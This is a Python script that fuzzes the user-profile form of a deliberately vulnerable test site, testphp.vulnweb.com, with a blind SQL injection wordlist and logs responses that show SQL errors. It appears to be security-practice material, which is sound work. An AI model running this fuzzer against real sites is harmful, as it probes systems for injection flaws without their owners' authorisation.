#!/usr/bin/python3
import requests
import sys
target_url='http://testphp.vulnweb.com/'
#/opt/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt
wordlist = sys.argv[1] 

#1 - Authenticate 
post_payload = {'uname':'test',
                'pass':'test'}

# Proxy for debug
proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

## The code
print("[-] Authenticating")
letsgo = requests.session()
#auth = letsgo.post(target_url+'userinfo.php',data=post_payload, proxies=proxies)
auth = letsgo.post(target_url+'userinfo.php',data=post_payload)
print(auth.status_code)
print(auth.headers)
#exit()

print("[-]- Starting Fuzzing")
f=open(wordlist,'r')
lines = f.readlines()
log=open('logfile.out','a')
for linetmp in lines: 
#  print(line,end="")
  line = linetmp.replace('\n','')
  post_payload = {'urname':'Bob',
                'ucc':'1234-1234-1234',
                'uemail':line,
                'uphone':'232332',
                'uaddress':'addr addr 23:AC:DD:FF',
                'update':'update'
                }
  #injection_point = letsgo.post(target_url+'userinfo.php',data=post_payload,proxies=proxies)
  injection_point = letsgo.post(target_url + 'userinfo.php', data=post_payload)
  status_code = injection_point.status_code
  #content_lenght=injection_point.headers['Content-Length']
  content_lenght=len(injection_point.content)
  time_elapsed = injection_point.elapsed.total_seconds()
  msg_request="[*] HTTP Status Code: {} Content_lenght: {} Response Time: {} \n\tPayload: {}".format(status_code,content_lenght,time_elapsed,line)
  print(msg_request)
  if 'You have an error in your SQL syntax' in injection_point.text:
    print('[*] Reflective Value found, filtering out')
    msg_content='\t'+str(injection_point.content)
    log.write(msg_request+'\n')
    log.write(msg_content+'\n')
    print(msg_content)

#  print(injection_point.text)
